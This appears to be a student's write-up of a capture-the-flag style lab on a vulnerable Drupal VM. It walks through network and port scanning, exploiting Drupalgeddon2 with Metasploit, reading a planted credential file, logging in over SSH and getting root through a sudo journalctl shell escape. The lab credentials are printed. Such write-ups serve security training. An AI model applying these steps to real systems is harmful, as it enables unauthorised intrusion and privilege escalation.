# Report Labs / Flavio POGGIOLI

## Table of contents

  - [Report Labs / Flavio POGGIOLI](#report-labs--flavio-poggioli)
  - [Table of contents](#table-of-contents)

## VM n°207 

Goal : find the root Flag.

### 1. Find IP address of the machine

```bash
$ sudo netdiscover -r 10.0.2.0/24
```
![picture 2](../images/dbdb62e0e1c5ed3fd7088a391cdb1a9cd4c1e52a818f786f2d4d36a9d44d2690.png)  

Our target is 10.0.2.5. 

The 2 first is VBox address (network and dhcp).

### 2. List all open ports

We need to determine the open ports and the services running on them using nmap with some options.

```bash
$ sudo nmap -p- 10.0.2.5
```
![picture 1](../images/e73bc8b9096a5159631c59bd2426f4de02b3ca41dd097dcd5a26f0dd8eaf51fb.png)  

For more precision on version and services, we can use the following command :

```bash 
nmap -Pn -sC -sV -p- 10.0.2.5
```
![picture 3](../images/9f9cacc3afecd896756c2760e43ec342aa6cdb354b96705a93835491c545faae.png)  

We can see that multiple ports are open (22, 80, 5000, 8081, 9001).

For the port 80, which host a web server, we can dig to find a something in arborescence directory. We will use dirb.

```bash
$ dirb http://10.0.2.5 -w
```
![picture 7](../images/059b96d242b3101a2431a397f418ca384f05011872e9a3883164636274b4185a.png)  

There is 2 files which can be interesting : /index.txt and /robots.txt.

In robots.txt, we can find about.html that dirb didn't find.

![picture 8](../images/d9b51a4ca1593f3067c49e15b984d7ffb835eb35522fe5acaf8199ba2f93a019.png)  

They told us to not brute force the vulnerable stuff because it doesn't work everytime.

We can try to search for the CMS like the name of the machine suggest it.

Drupal 7 is used on this machine (we have seen it on second nmap scan).

### 3. Find vulnerabilities

We can use searchsploit to find vulnerabilities on Drupal 7 that we will using with MetaSploit.

```bash
$ searchsploit drupal 7

$ msfconsole

$ search drupal 7
```
![picture 9](../images/e22bce70cb67f8c22d04c49821b1791dd63bd669412888441e8b45eb1304ea13.png)  

![picture 10](../images/9e97cbf808de61c54f70a8a1e598c0595d4c57b2b625082b0beb7afb03889186.png)  

### 4. Exploit

We can test the exploit drupal_drupalgeddon2 which has an "excellent" rank.

```bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
```

We need to set the options of the exploit.
To see what attributes are present in the exploit that needed to be set again, we will use the command :

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options
```

![picture 11](../images/142838e243e9dccfb0d7111135ec40859fb83272127518198e0349c25a88d2b4.png)  

We have to change 3 attributes : RHOSTS, RPORT and LPORT.

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rport
rport => 80
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rport 9001
rport => 9001
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lport 1234
lport => 1234
```

And now, we can run the exploit.

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

Now that we have an interpretzer, we can use the command "ls" and we can distinguish 2 files with a different last modified date than the other files / directories.

![picture 12](../images/2d63c959c2ae0c892d5460cdd2d4fe737fc1212cad2a37eaae0cd1ed1e477039.png)  

LICENSE.txt has nothing special but misc has some interesting files.

```bash
meterpreter > ls misc
```

After a search, there is a file with different permissions and again, a different last modified date : tyrell.pass.

![picture 13](../images/5704a953278b7be2d2a891c2c79651fcad584d335d10d0c56c82fd5cf8f89dd6.png)  

We find a username and a password to use it on SSH connection.

Now, we can list all users with the home directory.

![picture 14](../images/9c948e7a0dd8dd17aa15f0c2a071822d3f37b9ce5be342bc983a6c4faf122103.png)  

tyrell and ghost are empty but Elliot directory has a file named user.txt but we don't have the permission to read it.

### 5. SSH connection

Now that we have credentials :

```bash
Username: tyrell
Password: mR_R0bo7_i5_R3@!_
```

We can try to connect with these credentials on SSH connection.

![picture 15](../images/9cd3f862d06258f42786eaf807d826305bab2ca5b1478d1a5ebaa812705f6cf6.png)  

But tyrell cannot do a "sudo bash" to get a root shell.

![picture 16](../images/6838ea1c55cce90af94b36c33454b96ba54f4ee507afc2d8e9572c02f230c158.png)  

To gain root access, I've used GTFOBins, list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems

[journalctl](https://gtfobins.github.io/gtfobins/journalctl/) can be used to gain root access.

```bash
tyrell@vuln_cms:~$ sudo /bin/journalctl

!/bin/sh
```
And with that, you have root access.